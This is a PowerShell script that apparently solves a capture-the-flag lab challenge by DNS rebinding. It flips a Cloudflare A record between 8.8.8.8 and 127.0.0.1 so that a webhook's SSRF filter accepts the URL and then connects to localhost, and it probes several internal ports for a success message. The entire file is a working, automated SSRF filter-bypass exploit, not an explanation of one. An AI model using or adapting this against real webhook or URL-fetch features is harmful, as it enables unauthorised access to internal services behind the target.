$ErrorActionPreference = "Stop"

$Challenge = "https://terraria.pwnbox-lab.com/Y5Zo9oG33j/"
$DnsName = "renew.dotsy.fun"
$Ports = @(80, 3000, 5000, 8000, 8080, 9000)

$SecureToken = Read-Host "Cloudflare API Token" -AsSecureString
$Token = [System.Net.NetworkCredential]::new("", $SecureToken).Password
$ZoneId = Read-Host "Cloudflare Zone ID"

$Headers = @{
    Authorization = "Bearer $Token"
    "Content-Type" = "application/json"
}

function Get-DnsRecord {
    $encodedName = [uri]::EscapeDataString($DnsName)
    $uri = "https://api.cloudflare.com/client/v4/zones/$ZoneId/dns_records?type=A&name=$encodedName"
    $response = Invoke-RestMethod -Method Get -Uri $uri -Headers $Headers

    if (-not $response.success) { throw "Cloudflare API request failed." }
    if ($response.result.Count -eq 0) { throw "DNS record not found: $DnsName" }
    return $response.result[0]
}

function Set-DnsIp {
    param([Parameter(Mandatory = $true)][string]$Ip)

    $body = @{
        type = "A"
        name = $DnsName
        content = $Ip
        ttl = 60
        proxied = $false
    } | ConvertTo-Json

    $uri = "https://api.cloudflare.com/client/v4/zones/$ZoneId/dns_records/$script:RecordId"
    $response = Invoke-RestMethod -Method Patch -Uri $uri -Headers $Headers -Body $body
    if (-not $response.success) { throw "Could not update DNS record." }
    Write-Host "[DNS] $DnsName -> $Ip"
}

function Wait-Dns {
    param([Parameter(Mandatory = $true)][string]$ExpectedIp)

    for ($attempt = 1; $attempt -le 60; $attempt++) {
        try {
            $answers = Resolve-DnsName -Name $DnsName -Server "1.1.1.1" -Type A -ErrorAction Stop
            $ips = @($answers | Where-Object { $_.IPAddress } | Select-Object -ExpandProperty IPAddress)
            if ($ips -contains $ExpectedIp) {
                Write-Host "[DNS] Public DNS now returns $ExpectedIp"
                return $true
            }
        } catch {
            Write-Host "[DNS] Resolution failed on attempt $attempt"
        }

        Write-Host "[DNS] Waiting for $ExpectedIp - attempt $attempt"
        Start-Sleep -Seconds 5
    }
    return $false
}

function Save-Webhook {
    param([Parameter(Mandatory = $true)][string]$TargetUrl)

    Remove-Item ".\cookies.txt" -ErrorAction SilentlyContinue

    for ($attempt = 1; $attempt -le 40; $attempt++) {
        $response = & curl.exe -s -c "cookies.txt" -b "cookies.txt" $Challenge -H "Content-Type: application/x-www-form-urlencoded" --data "url=$TargetUrl"
        $response | Set-Content ".\save-response.html" -Encoding UTF8

        if ($response -match "Webhook saved") {
            Write-Host "[+] Webhook saved: $TargetUrl"
            return $true
        }

        if ($response -match "Tricky") { Write-Host "[-] Challenge still sees an internal IP." }
        elseif ($response -match "Could not resolve") { Write-Host "[-] Challenge could not resolve the domain." }
        else { Write-Host "[-] Save failed - attempt $attempt" }

        Start-Sleep -Seconds 10
    }
    return $false
}

function Test-Webhook {
    param([Parameter(Mandatory = $true)][int]$Port)

    for ($attempt = 1; $attempt -le 40; $attempt++) {
        $response = & curl.exe -s -L -c "cookies.txt" -b "cookies.txt" $Challenge -H "Content-Type: application/x-www-form-urlencoded" --data "test_webhook=1"
        $response | Set-Content ".\response-$Port.html" -Encoding UTF8

        if ($response -match "Bravo|Next level") {
            Write-Host ""
            Write-Host "========== SOLVED ==========" -ForegroundColor Green
            ($response | Select-String -Pattern "Bravo|Next level").Line
            Write-Host "Full response saved to response-$Port.html"
            return "SOLVED"
        }

        if ($response -match "Connection timed out") {
            Write-Host "[$Port] Old DNS value is still cached - attempt $attempt"
            Start-Sleep -Seconds 15
            continue
        }

        if ($response -match "Couldn't connect|Failed to connect|Connection refused") {
            Write-Host "[$Port] DNS reached 127.0.0.1, but the port is closed."
            return "CLOSED"
        }

        if ($response -match "<pre>") {
            Write-Host "[$Port] Internal HTTP response received."
            Write-Host "Saved to response-$Port.html"
            return "OPEN"
        }

        Write-Host "[$Port] Different response received."
        Write-Host "Saved to response-$Port.html"
        return "OTHER"
    }
    return "TIMEOUT"
}

Write-Host "[*] Finding Cloudflare DNS record..."
$record = Get-DnsRecord
$script:RecordId = $record.id
Write-Host "[+] Record found: $script:RecordId"

foreach ($port in $Ports) {
    Write-Host ""
    Write-Host "========== TESTING PORT $port ==========" -ForegroundColor Cyan

    Set-DnsIp -Ip "8.8.8.8"
    if (-not (Wait-Dns -ExpectedIp "8.8.8.8")) {
        Write-Host "DNS update to 8.8.8.8 took too long."
        continue
    }

    if ($port -eq 80) { $target = "http://$DnsName/" }
    else { $target = "http://$DnsName`:$port/" }

    if (-not (Save-Webhook -TargetUrl $target)) {
        Write-Host "Could not save webhook for port $port."
        continue
    }

    Set-DnsIp -Ip "127.0.0.1"
    if (-not (Wait-Dns -ExpectedIp "127.0.0.1")) {
        Write-Host "DNS update to 127.0.0.1 took too long."
        continue
    }

    $result = Test-Webhook -Port $port
    if ($result -eq "SOLVED") { exit 0 }
}

Write-Host ""
Write-Host "No next-level response was found."
Write-Host "Check the response-PORT.html files."
